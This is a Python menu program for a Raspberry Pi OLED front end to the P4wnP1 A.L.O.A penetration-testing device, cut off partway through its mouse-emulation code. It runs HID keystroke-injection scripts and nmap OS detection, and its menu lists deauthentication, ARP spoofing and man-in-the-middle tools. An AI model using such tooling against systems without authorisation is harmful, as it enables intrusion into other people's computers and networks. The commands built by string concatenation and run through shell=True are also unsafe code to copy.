#!/usr/bin/env python3


# import base64
import datetime
import os
import socket
import struct
import subprocess

# import sys
import time
from subprocess import Popen

import RPi.GPIO as GPIO
import smbus2 as smbus

# from luma.core import lib
from luma.core.interface.serial import i2c, spi
from luma.core.render import canvas

# from luma.core.sprite_system import framerate_regulator
from luma.oled.device import sh1106
from PIL import Image, ImageFont

UPS = 0  # 1 = UPS Lite connected / 0 = No UPS Lite hat
SCNTYPE = 1  # 1= OLED #2 = TERMINAL MODE BETA TESTS VERSION

# this is related to the ups bus not the screen
bus = smbus.SMBus(1)  # 0 = /dev/i2c-0 (port I2C0), 1 = /dev/i2c-1 (port I2C1)

GPIO.setwarnings(False)
# P4wnP1 essential const
hidpath = "/usr/local/P4wnP1/HIDScripts/"
sshpath = "/usr/local/P4wnP1/scripts/"

# Load default font.
font = ImageFont.load("fonts/Tamsyn6x12r.pil")
# Create blank image for drawing.
# Make sure to create image with mode '1' for 1-bit color.
width = 128
height = 64
image = Image.new("1", (width, height))
# First define some constants to allow easy resizing of shapes.
padding = -2
top = padding
bottom = height - padding
line1 = top
line2 = top + 8
line3 = top + 16
line4 = top + 25
line5 = top + 34
line6 = top + 43
line7 = top + 52
brightness = 255  # Max
file = ""
# Move left to right keeping track of the current x position for drawing shapes.
x = 0
RST = 25
CS = 8
DC = 24

# GPIO define and OLED configuration
RST_PIN = 25  # waveshare settings
CS_PIN = 8  # waveshare settings
DC_PIN = 24  # waveshare settings
KEY_UP_PIN = 6  # stick up
KEY_DOWN_PIN = 19  # stick down
KEY_LEFT_PIN = 5  # 5  #sitck left // go back
KEY_RIGHT_PIN = 26  # stick right // go in // validate
KEY_PRESS_PIN = 13  # stick center button
KEY1_PIN = 21  # key 1 // up
KEY2_PIN = 20  # 20 #key 2 // cancel/goback
KEY3_PIN = 16  # key 3 // down
USER_I2C = 0  # set to 1 if your oled is I2C or  0 if use SPI interface
# init GPIO
GPIO.setmode(GPIO.BCM)
GPIO.setup(KEY_UP_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)  # Input with pull-up
GPIO.setup(KEY_DOWN_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)  # Input with pull-up
GPIO.setup(KEY_LEFT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)  # Input with pull-up
GPIO.setup(KEY_RIGHT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)  # Input with pull-up
GPIO.setup(KEY_PRESS_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)  # Input with pull-up
GPIO.setup(KEY1_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)  # Input with pull-up
GPIO.setup(KEY2_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)  # Input with pull-up
GPIO.setup(KEY3_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)  # Input with pull-up
screensaver = 0
# SPI
# serial = spi(device=0, port=0, bus_speed_hz = 8000000, transfer_size = 4096, gpio_DC = 24, gpio_RST = 25)
if SCNTYPE == 1:
    if USER_I2C == 1:
        GPIO.setmode(GPIO.BCM)
        GPIO.setup(RST, GPIO.OUT)
        GPIO.output(RST, GPIO.HIGH)
        serial = i2c(port=1, address=0x3C)
    else:
        serial = spi(
            device=0,
            port=0,
            bus_speed_hz=8000000,
            transfer_size=4096,
            gpio_DC=24,
            gpio_RST=25,
        )
if SCNTYPE == 1:
    device = sh1106(serial, rotate=2)  # sh1106

def readVoltage(bus):
    # Function returns as float the voltage from the Raspi UPS Hat via the provided SMBus object.
    address = 0x36
    read = bus.read_word_data(address, 2)
    swapped = struct.unpack("<H", struct.pack(">H", read))[0]
    voltage = swapped * 1.25 / 1000 / 16
    return voltage


def readCapacity(bus):
    # This function returns as a float the remaining capacity of the battery connected to the Raspi UPS Hat via the provided SMBus object
    address = 0x36
    read = bus.read_word_data(address, 4)
    swapped = struct.unpack("<H", struct.pack(">H", read))[0]
    capacity = swapped / 256
    return capacity

def execCmd(cmd):
    result = ""
    try:
        result = str(subprocess.check_output(cmd, shell=True))
    except subprocess.CalledProcessError:
        result = -1

    # if we failed to run the command
    if result == -1:
        displayErrorNew("error when running", cmd)
        time.sleep(5)
        return ()
    
    return result


def execCmdNoStr(cmd):
    try:
        return subprocess.check_output(cmd, shell=True)
    except subprocess.CalledProcessError:
        return -1


def displayError():
    displayText("", "", "", "      INTERNAL ERROR", "", "", "")
    time.sleep(5)

def displayErrorNew(error1, error2):
    displayText("", "", error1, error2, "", "", "")
    time.sleep(5)

def autoKillCommand(tx1, t):
    tx2 = "timeout " + str(t) + "s" + tx1
    cmd = (
        "touch touchedcommand.sh && echo '#!/bin/bash\n"
        + tx1
        + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
    )
    result = execCmd(cmd)
    if result == -1:
        displayError()
        displayErrorNew("execCmd returned -1")
        return ()
    Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
    # displayText("","","Executed","","","","")
    time.sleep(t)
    # print(cmd)
    # subprocess.call(["timeout 2s",str(cmd)])
    ##Popen(['timeout',cmd],preexec_fn=os.setpgrp)
    cmd = "rm nohup.out && rm touchedcommand.sh"
    toDEl = execCmd(cmd)
    if toDEl == -1:
        displayError()
        return -1
    errore = 0
    while errore == 0:
        cmd = "ps -aux | grep '" + tx1 + "' | head -n 1 | cut -d ' ' -f7"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            time.sleep(5)
            return ()
        cmd = "kill " + (str(result).split("'")[1])[:-2]
        # print(cmd)
        result = execCmd(cmd)
        if result == -1:
            # print("errore nella kill")
            # displayError()
            time.sleep(5)
            errore = 1
    return True


def killCommand(cmd):
    errore = 0
    while errore == 0:
        cmd = "ps -aux | grep '" + cmd + "' | head -n 1 | cut -d ' ' -f7"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            time.sleep(5)
            return ()
        cmd = "kill " + (str(result).split("'")[1])[:-2]
        # print(cmd)
        result = execCmd(cmd)
        if result == -1:
            # print("errore nella kill")
            # displayError()
            errore = 1
    errore = 0
    while errore == 0:
        cmd = "ps -aux | grep '" + cmd + "' | head -n 1 | cut -d ' ' -f8"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            time.sleep(5)
            return ()
        cmd = "kill " + (str(result).split("'")[1])[:-2]
        # print(cmd)
        result = execCmd(cmd)
        if result == -1:
            # print("errore nella kill")
            # displayError()
            errore = 1
    return ()


def autoKillCommandNoKill(tx1, t):
    cmd = (
        "touch touchedcommand.sh && echo '#!/bin/bash\n"
        + tx1
        + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
    )
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
    # displayText("","","Executed","","","","")
    # print(cmd)
    # subprocess.call(["timeout 2s",str(cmd)])
    ##Popen(['timeout',cmd],preexec_fn=os.setpgrp)
    cmd = "rm nohup.out && rm touchedcommand.sh"
    toDEl = execCmd(cmd)
    if toDEl == -1:
        displayError()
        return -1
    return 1


def waitingLoop(msg):
    uscire = 0
    while uscire == 0:
        if GPIO.input(KEY_RIGHT_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            uscire = 1
        displayMsg("msg", 0.2)


def checklist(_list):
    listattack = _list
    maximum = len(listattack)  # number of records
    cur = 0
    lastmenu = ""
    item = ["", "", "", "", "", "", "", ""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        # on boucle
        tok = 0
        if maximum < 7:
            for n in range(0, 7):
                if n < maximum:
                    if n == cur:
                        item[n] = ">" + listattack[n]
                    else:
                        item[n] = " " + listattack[n]
                else:
                    item[n] = ""
        else:
            if cur + 7 < maximum:
                for n in range(cur, cur + 7):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
            else:
                for n in range(maximum - 8, maximum - 1):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
        if GPIO.input(KEY_UP_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur - 1
            if cur < 0:
                cur = 0
        if GPIO.input(KEY_DOWN_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur + 1
            if cur > maximum - 2:
                cur = maximum - 2
        if not GPIO.input(KEY_LEFT_PIN):  # button is released
            return ()
        if GPIO.input(KEY_RIGHT_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            lastmenu = listattack[cur]
            # print(lastmenu)
            return lastmenu
        # print(str(cur) + " " + listattack[cur])        #debug
        displayText(
            item[0], item[1], item[2], item[3], item[4], item[5], item[6]
        )
        time.sleep(0.1)
    return ""


def displayMsg(msg, t):
    displayText("", "", "", str(msg), "", "", "")
    time.sleep(t)


def displayText(l1, l2, l3, l4, l5, l6, l7):
    # simple routine to display 7 lines of text
    if SCNTYPE == 1:
        with canvas(device) as draw:
            draw.text((0, line1), l1, font=font, fill=255)
            draw.text((0, line2), l2, font=font, fill=255)
            draw.text((0, line3), l3, font=font, fill=255)
            draw.text((0, line4), l4, font=font, fill=255)
            draw.text((0, line5), l5, font=font, fill=255)
            draw.text((0, line6), l6, font=font, fill=255)
            draw.text((0, line7), l7, font=font, fill=255)
    if SCNTYPE == 2:
        os.system("clear")
        print(l1)
        print(l2)
        print(l3)
        print(l4)
        print(l5)
        print(l6)
        print(l7)


def shell(cmd):
    return subprocess.check_output(cmd, shell=True)


def switchMenu(argument):
    switcher = {
        0: "_  P4wnP1 A.L.O.A",
        1: "_SYSTEM RELATED",
        2: "_HID MANAGEMENT",
        3: "_WIRELESS THINGS",
        4: "_TRIGGERS FEATURES",
        5: "_TEMPLATES FEATURES",
        6: "_MITM TOOLS",
        7: "_System information",
        8: "_OLED brightness",
        9: "_HOST OS detection",
        10: "_Display OFF",
        11: "_Keys Test",
        12: "_Reboot GUI",
        13: "_System shutdown",
        14: "_RUN HID script",
        15: "_GAMEPAD",
        16: "_MOUSE",
        17: "_Set Typing Speed",
        18: "_Set Key layout",
        19: "_",
        20: "_",
        21: "_Scan WIFI AP",
        22: "_Hosts Discovery",
        23: "_Nmap",
        24: "_Vulnerability Scan",
        25: "_Deauther-Bcast",
        26: "_Deauther-Client",
        27: "_",
        28: "_Send to oled group",
        29: "_",
        30: "_",
        31: "_",
        32: "_",
        33: "_",
        34: "_",
        35: "_FULL SETTINGS",
        36: "_BLUETOOTH",
        37: "_USB",
        38: "_WIFI",
        39: "_TRIGGER ACTIONS",
        40: "_NETWORK",
        41: "_",
        42: "_ArpSpoofing",
        43: "_",
        44: "_",
        45: "_",
        46: "_",
        47: "_",
        48: "_",
        # newmenu
        49: "_WIRED THINGS",
        50: "_newsubmenu2",
        51: "_newsubmenu3",
        52: "_newsubmenu4",
        53: "_newsubmenu5",
        54: "_newsubmenu6",
        55: "_UpdateOledMenu",
        # newsections
        56: "_Nmap 172.16.0.2",
        57: "_",
        58: "_",
        59: "_",
        60: "_",
        61: "_",
        62: "_",
        # newsections
        63: "_",
        64: "_",
        65: "_",
        66: "_",
        67: "_",
        68: "_",
        69: "_",
    }
    return switcher.get(argument, "Invalid")


def about():
    # simple sub routine to show an About
    displayText(
        " : P4wnP1 A.L.O.A :",
        "P4wnP1 (c) @Mame82",
        "V 1.0",
        "This GUI is improved by",
        "Fuocoman",
        "Original Code by",
        "BeBoXoS",
    )
    while GPIO.input(KEY_LEFT_PIN):
        # wait
        menu = 1
    page = 0


# system information sub routine
def systemInfo():
    while GPIO.input(KEY_LEFT_PIN):
        now = datetime.datetime.now()
        today_time = now.strftime("%H:%M:%S")
        today_date = now.strftime("%d %b %y")
        cmd = "hostname -I"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()
        IP = result.split(" ")[0]
        IP2 = result.split(" ")[1]
        IP3 = result.split(" ")[2]

        if UPS == 1:
            # volt = "BAT :%5.2fV " % readVoltage(bus) #Battery Voltage is irrelevant and takes too much space on screen
            batt = int(readCapacity(bus))
            if batt > 100:
                batt = 100
            batt = " BAT: " + str(batt) + "%"
        else:
            batt = " BAT: N/C"

        # BattTemp = volt + str(batt) + "% t:" + str(temp)
        # print(str(subprocess.check_output(cmd, shell = True )))
        cmd = "top -bn1 | grep %Cpu | awk '{printf \"%.0f\",$2}'"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()
        temp = os.popen("cat /sys/class/thermal/thermal_zone0/temp").readline()
        temp = int(temp) / 1000
        CPU = "CPU.:" + result.split("'")[1] + "% TEMP:" + str(temp)
        cmd = "free -m | awk 'NR==2{printf \"MEM :%.2f%%\", $3*100/$2 }'"
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()
        MemBat = result.split("'")[1] + batt
        cmd = 'df -h | awk \'$NF=="/"{printf "Disk: %d/%dGB %s", $3,$2,$5}\''
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()
        Disk = result.split("'")[1]
        # print(str(IP3))
        if str(IP3) == str("\\n'"):
            IP3 = "refresh the Connection"
        displayText(
            today_date + " " + today_time,
            str(CPU),
            str(MemBat),
            Disk,
            "WIFI: " + IP.split("'")[1],
            "BTH.: " + str(IP3),
            "USB.: " + str(IP2),
        )
        time.sleep(0.1)
    # page = 7


def identifyOS(ips):
    # return os name if found ex. Microsoft Windows 7 ,  Linux 3.X
    return shell(
        "nmap -p 22,80,445,65123,56123 -O "
        + ips
        + ' | grep Running: | cut -d ":" -f2 | cut -d "|" -f1'
    )


def osDetails(ips):
    return shell(
        "nmap -p 22,80,445,65123,56123 -O "
        + ips
        + ' | grep "OS details:" | cut -d ":" -f2 | cut -d "," -f1'
    )


def setContrast(contrast):
    # set contrast 0 to 255
    if SCNTYPE == 1:
        while GPIO.input(KEY_LEFT_PIN):
            # loop until press left to quit
            with canvas(device) as draw:
                if GPIO.input(KEY_UP_PIN):  # button is released
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=0
                    )  # Up
                else:  # button is pressed:
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=1
                    )  # Up filled
                    contrast = contrast + 5
                    if contrast > 255:
                        contrast = 255

                if GPIO.input(KEY_DOWN_PIN):  # button is released
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=0
                    )  # down
                else:  # button is pressed:
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=1
                    )  # down filled
                    contrast = contrast - 5
                    if contrast < 0:
                        contrast = 0
                device.contrast(contrast)
                draw.text((54, line4), "Value : " + str(contrast), font=font, fill=255)
    return contrast


def splash():
    img_path = os.path.abspath(
        os.path.join(os.path.dirname(__file__), "images", "bootwhat.bmp")
    )
    splash = (
        Image.open(img_path)
        .transform(
            (device.width, device.height),
            Image.AFFINE,
            (1, 0, 0, 0, 1, 0),
            Image.BILINEAR,
        )
        .convert(device.mode)
    )
    device.display(splash)
    time.sleep(5)  # 5 sec splash boot screen


def screenOff():
    # put screen off until press left
    if SCNTYPE == 1:
        while GPIO.input(KEY_LEFT_PIN):
            device.hide()
            time.sleep(0.1)
        device.show()


def keyTest():
    if SCNTYPE == 1:
        while GPIO.input(KEY_LEFT_PIN):
            with canvas(device) as draw:
                if GPIO.input(KEY_UP_PIN):  # button is released
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=0
                    )  # Up
                else:  # button is pressed:
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=1
                    )  # Up filled

                if GPIO.input(KEY_LEFT_PIN):  # button is released
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=0
                    )  # left
                else:  # button is pressed:
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=1
                    )  # left filled

                if GPIO.input(KEY_RIGHT_PIN):  # button is released
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=0
                    )  # right
                else:  # button is pressed:
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=1
                    )  # right filled

                if GPIO.input(KEY_DOWN_PIN):  # button is released
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=0
                    )  # down
                else:  # button is pressed:
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=1
                    )  # down filled

                if GPIO.input(KEY_PRESS_PIN):  # button is released
                    draw.rectangle((20, 22, 40, 40), outline=255, fill=0)  # center
                else:  # button is pressed:
                    draw.rectangle(
                        (20, 22, 40, 40), outline=255, fill=1
                    )  # center filled

                if GPIO.input(KEY1_PIN):  # button is released
                    draw.ellipse((70, 0, 90, 20), outline=255, fill=0)  # A button
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 0, 90, 20), outline=255, fill=1
                    )  # A button filled

                if GPIO.input(KEY2_PIN):  # button is released
                    draw.ellipse((100, 20, 120, 40), outline=255, fill=0)  # B button
                else:  # button is pressed:
                    draw.ellipse(
                        (100, 20, 120, 40), outline=255, fill=1
                    )  # B button filled

                if GPIO.input(KEY3_PIN):  # button is released
                    draw.ellipse((70, 40, 90, 60), outline=255, fill=0)  # A button
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 40, 90, 60), outline=255, fill=1
                    )  # A button filled


def fileSelect(path, ext):
    cmd = "ls -F --format=single-column  " + path + "*" + ext
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    listattack = result.split("'")[1]
    listattack = listattack.replace(ext, "")
    listattack = listattack.replace(path, "")
    listattack = listattack.replace("*", "")
    listattack = listattack.replace("\\n", "\\")
    listattack = listattack.split("\\")
    print(listattack)
    maximum = len(listattack)  # number of records
    cur = 0
    lastmenu = ""
    item = ["", "", "", "", "", "", "", ""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        # on boucle
        tok = 0
        if maximum < 7:
            for n in range(0, 7):
                if n < maximum:
                    if n == cur:
                        item[n] = ">" + listattack[n]
                    else:
                        item[n] = " " + listattack[n]
                else:
                    item[n] = ""
        else:
            if cur + 7 < maximum:
                for n in range(cur, cur + 7):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
            else:
                for n in range(maximum - 8, maximum - 1):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
        if GPIO.input(KEY_UP_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur - 1
            if cur < 0:
                cur = 0
        if GPIO.input(KEY_DOWN_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur + 1
            if cur > maximum - 2:
                cur = maximum - 2
        if GPIO.input(KEY_RIGHT_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            lastmenu = listattack[cur] + ext
            return lastmenu
        # print(str(cur) + " " + listattack[cur])        #debug
        displayText(
            item[0], item[1], item[2], item[3], item[4], item[5], item[6]
        )
        time.sleep(0.1)
    return ""


def templateSelect(list):
    # GetTemplateList("BLUETOOTH").split("\n")
    file = GetTemplateList(list).split("\n")
    maximum = len(file)
    cur = 1
    lastmenu = ""
    item = ["", "", "", "", "", "", "", ""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        # on boucle
        tok = 1
        if maximum < 8:
            for n in range(1, 8):
                if n < maximum:
                    if n == cur:
                        item[n - 1] = ">" + file[n]
                    else:
                        item[n - 1] = " " + file[n]
                else:
                    item[n - 1] = ""
        else:
            if cur + 7 < maximum:
                for n in range(cur, cur + 7):
                    if n == cur:
                        item[tok - 1] = ">" + file[n]
                    else:
                        item[tok - 1] = " " + file[n]
                    tok = tok + 1
            else:
                for n in range(maximum - 8, maximum - 1):
                    if n == cur:
                        item[tok - 1] = ">" + file[n]
                    else:
                        item[tok - 1] = " " + file[n]
                    tok = tok + 1
        if GPIO.input(KEY_UP_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur - 1
            if cur < 1:
                cur = 1
        if GPIO.input(KEY_DOWN_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            cur = cur + 1
            if cur > maximum - 2:
                cur = maximum - 2
        if GPIO.input(KEY_RIGHT_PIN):  # button is released
            menu = 1
        else:  # button is pressed:
            lastmenu = file[cur]
            print(lastmenu)
            return lastmenu
        # ----------
        displayText(
            item[0], item[1], item[2], item[3], item[4], item[5], item[6]
        )
        time.sleep(0.1)


def runhid():
    # choose and run (or not) a script
    file = fileSelect(hidpath, ".js")
    time.sleep(0.5)
    if file == "":
        return ()
    while GPIO.input(KEY_LEFT_PIN):
        answer = 0
        while answer == 0:
            displayText(
                "YES              YES", "", "", file, "", "", "NO                NO"
            )
            if GPIO.input(KEY_UP_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 1
            if GPIO.input(KEY_DOWN_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 2
            if GPIO.input(KEY1_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 1
            if GPIO.input(KEY3_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 2
        if answer == 2:
            return ()
        time.sleep(0.5)  # pause
        answer = 0
        while answer == 0:
            displayText(
                "   Run Background job",
                "",
                "",
                "Method ?       CANCEL",
                "",
                "",
                "       Run direct job",
            )
            if GPIO.input(KEY_UP_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 1
            if GPIO.input(KEY_LEFT_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 2
            if GPIO.input(KEY_DOWN_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 3
            if GPIO.input(KEY1_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 1
            if GPIO.input(KEY2_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 2
            if GPIO.input(KEY3_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 3
        if answer == 2:
            return ()
        displayText("", "", "", "HID Script running...", "", "", "")
        if answer == 1:
            # run as background job P4wnP1_cli hid job command
            cmd = "P4wnP1_cli hid job '" + file + "'"
            result = execCmd(cmd)
            if result == -1:
                displayError()
                return ()
            return ()
        if answer == 3:
            # run hid script directly
            cmd = "P4wnP1_cli hid run '" + file + "'"
            result = execCmd(cmd)
            if result == -1:
                displayError()
                return ()
            return ()


def restart():
    displayText("", "", "", "PLEASE WAIT ...", "", "", "")
    cmd = "python3.7 /root/BeBoXGui/runmenu.py &"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    return ()


def GetTemplateList(type):
    # get list of template
    # Possible types : FULL_SETTINGS , BLUETOOTH , USB , WIFI , TRIGGER_ACTIONS , NETWORK
    cmd = "P4wnP1_cli template list"
    result = execCmd(cmd)
    if result == -1:
        displayError()
        return ()
    list = result
    list = list.replace("Templates of type ", "")  # remove uwanted text
    list = list.replace(" :", "")
    list = list.replace("------------------------------------\n", "")
    list = list.split("\\n")
    result = ""
    found = 0
    for n in range(0, len(list)):
        if list[n] == type:
            found = 1
        if list[n] == "":
            found = 0
        if found == 1:
            result = result + list[n] + "\n"
    return result


def ApplyTemplate(template, section):
    print(template)
    print(section)
    # displayText(
    #     "THERE IS A BUG",
    #     "u need to",
    #     "do this 2 times",
    #     file,
    #     "bug of P4wnp1",
    #     "not mine",
    #     "               ",
    # )
    # time.sleep(3)
    while GPIO.input(KEY_LEFT_PIN):
        answer = 0
        while answer == 0:
            displayText(
                "YES              YES", "", "", file, "", "", "NO                NO"
            )
            if GPIO.input(KEY_UP_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 1
            if GPIO.input(KEY_DOWN_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 2
            if GPIO.input(KEY1_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 1
            if GPIO.input(KEY3_PIN):  # button is released
                menu = 1
            else:  # button is pressed:
                answer = 2
        if answer == 2:
            return ()
        time.sleep(0.5)  # pause
        cmd = "P4wnP1_cli template deploy -" + section + " " + template + ""
        result = execCmd(cmd)
        if result == -1:
            displayError()
            return ()
        return ()


def Gamepad():
    if SCNTYPE == 1:
        while GPIO.input(KEY_PRESS_PIN):
            with canvas(device) as draw:
                if GPIO.input(KEY_UP_PIN):  # button is released
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=0
                    )  # Up
                else:  # button is pressed:
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=1
                    )  # Up filled
                    result = subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"UP\")'", shell=True
                    )

                if GPIO.input(KEY_LEFT_PIN):  # button is released
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=0
                    )  # left
                else:  # button is pressed:
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=1
                    )  # left filled
                    result = subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"LEFT\")'", shell=True
                    )

                if GPIO.input(KEY_RIGHT_PIN):  # button is released
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=0
                    )  # right
                else:  # button is pressed:
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=1
                    )  # right filled
                    result = subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"RIGHT\")'", shell=True
                    )

                if GPIO.input(KEY_DOWN_PIN):  # button is released
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=0
                    )  # down
                else:  # button is pressed:
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=1
                    )  # down filled
                    result = subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"DOWN\")'", shell=True
                    )

                if GPIO.input(KEY1_PIN):  # button is released
                    draw.ellipse((70, 0, 90, 20), outline=255, fill=0)  # A button
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 0, 90, 20), outline=255, fill=1
                    )  # A button filled
                    result = subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"Q\")'", shell=True
                    )

                if GPIO.input(KEY2_PIN):  # button is released
                    draw.ellipse((100, 20, 120, 40), outline=255, fill=0)  # B button
                else:  # button is pressed:
                    draw.ellipse(
                        (100, 20, 120, 40), outline=255, fill=1
                    )  # B button filled
                    result = subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"W\")'", shell=True
                    )

                if GPIO.input(KEY3_PIN):  # button is released
                    draw.ellipse((70, 40, 90, 60), outline=255, fill=0)  # A button
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 40, 90, 60), outline=255, fill=1
                    )  # A button filled
                    result = subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"E\")'", shell=True
                    )


def Mouse():
    button1 = 0
    button2 = 0
    step = 10
    time.sleep(0.5)
    if SCNTYPE == 1:
        while GPIO.input(KEY2_PIN):
            with canvas(device) as draw:
                if GPIO.input(KEY_UP_PIN):  # button is released
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=0
                    )  # Up
                else:  # button is pressed:
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=1
                    )  # Up filled
                    result = subprocess.check_output(
                        "P4wnP1_cli hid run -c 'moveStepped(0,-" + str(step) + ")'",
                        shell=True,
                    )

                if GPIO.input(KEY_LEFT_PIN):  # button is released
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=0
                    )  # left
                else:  # button is pressed:
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=1
                    )  # left filled
                    result = subprocess.check_output(
                        "P4wnP1_cli hid run -c 'moveStepped(-" + str(step) + ",0)'",
                        shell=True,
                    )

                if GPIO.input(KEY_RIGHT_PIN):  # button is released
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=0
                    )  # right
                else:  # button is pressed:
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=1
                    )  # right filled
                    result = subprocess.check_output(
                        "P4wnP1_cli hid run -c 'moveStepped(" + str(step) + ",0)'",
                        shell=True,
                    )

                if GPIO.input(KEY_DOWN_PIN):  # button is released
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=0
                    )  # down
                else:  # button is pressed:
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=1
                    )  # down filled
                    result = subprocess.check_output(
                        "P4wnP1_cli hid run -c 'moveStepped(0," + str(step) + ")'",
                        shell=True,
                    )

                if GPIO.input(KEY_PRESS_PIN):  # button is released
                    draw.rectangle((20, 22, 40, 40), outline=255, fill=0)  # center
                else:  # button is pressed:
                    draw.rectangle(
                        (20, 22, 40, 40), outline=255, fill=1
                    )  # center filled
                    if step == 10:
                        # result = subprocess.check_output("P4wnP1_cli hid run -c 'button(BT1)'", shell = True )
                        step = 100
                        time.sleep(0.2)
                    else:
                        # result = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True )
                        step = 10
                        time.sleep(0.2)

                if GPIO.input(KEY1_PIN):  # button is released
                    draw.ellipse((70, 0, 90, 20), outline=255, fill=0)  # A button
                    # result = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True )
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 0, 90, 20), outline=255, fill=1
                    )  # A button filled
                    if button1 == 0:
                        result = subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BT1)'", shell=True
                        )
                        button1 = 1
                        time.sleep(0.2)
                        result = subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BTNONE)'", shell=True
